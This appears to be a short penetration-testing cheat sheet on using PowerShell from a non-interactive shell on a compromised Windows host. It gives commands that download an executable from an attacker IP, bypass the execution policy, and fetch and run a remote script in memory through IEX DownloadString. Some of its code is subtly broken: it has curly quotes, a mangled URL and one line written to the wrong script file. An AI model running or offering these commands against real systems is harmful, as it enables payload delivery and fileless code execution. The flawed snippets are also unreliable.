# Powershell

## Quick How To

* cannot use Powershell.exe with a non-interactive shell
* therefore, create a Powershell script then execute it

```bash
echo $storageDir = $pwd > wget.ps1
echo $webClient = New-Object System.Net.Webclient >> wget.ps1
echo $url = “[http://192.168.1.101/file.exe”](http://192.168.1.101/file.exe%E2%80%9D) >> wget.ps1
echo $file = “output-file.exe” >> wget1.ps1
echo $webclient.DownloadFile($url, $file) >> wget.ps1
```

* now, invoke the script

```bash
# use this to set the execution policy and download the file
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

# or this one-liner
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'newfile.exe')
```

## Execute Remote Powershell Files without Saving them Locally

```bash
# first, create or download a script on the attacking machine
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/testscript.ps1')
```
